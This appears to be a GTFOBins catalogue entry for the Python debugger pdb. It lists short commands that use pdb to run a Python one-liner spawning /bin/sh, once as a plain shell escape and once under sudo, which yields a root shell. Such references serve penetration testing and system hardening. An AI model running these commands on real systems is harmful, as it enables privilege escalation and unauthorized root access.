---
description: This allows to execute [`python`](/gtfobins/python/) code, other functions may apply.
functions:
  shell:
    - code: |
        TF=$(mktemp)
        echo 'import os; os.system("/bin/sh")' > $TF
        pdb $TF
        cont
  sudo:
    - code: |
        TF=$(mktemp)
        echo 'import os; os.system("/bin/sh")' > $TF
        sudo pdb $TF
        cont
---
